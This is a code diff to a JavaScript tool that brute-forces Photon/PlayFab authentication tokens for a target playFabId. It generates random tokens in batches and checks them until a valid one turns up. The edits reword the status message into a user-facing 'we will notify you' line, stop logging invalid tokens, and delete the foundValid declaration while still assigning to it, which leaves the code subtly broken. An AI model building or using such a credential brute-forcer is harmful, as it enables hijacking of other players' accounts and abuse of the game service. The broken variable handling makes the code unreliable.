@@ -1492,7 +1492,7 @@
       }
     }
 
-    function generateRandomToken() {
+   function generateRandomToken() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
   const tokenLength = 50; // Standard UUID-like length for Photon tokens
   let token = '';
@@ -1534,7 +1534,7 @@ async function startBruteforce() {
   }
 
   bruteforceRunning = true;
-  output.textContent = "Starting Photon token bruteforce...\n";
+  output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
 
   async function tryTokenBatch() {
     if (!bruteforceRunning) return;
@@ -1543,7 +1543,6 @@ async function startBruteforce() {
     const tokens = Array.from({ length: batchSize }, generateRandomToken);
     const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
 
-    let foundValid = false;
     const outputBuffer = [];
 
     for (const { token, result, error } of results) {
@@ -1552,8 +1551,6 @@ async function startBruteforce() {
       } else if (result.resultCode === 1) {
         outputBuffer.push(`✅ Valid token found: ${token}`);
         foundValid = true;
-      } else {
-        outputBuffer.push(`❌ Invalid token: ${token}`);
       }
     }
 
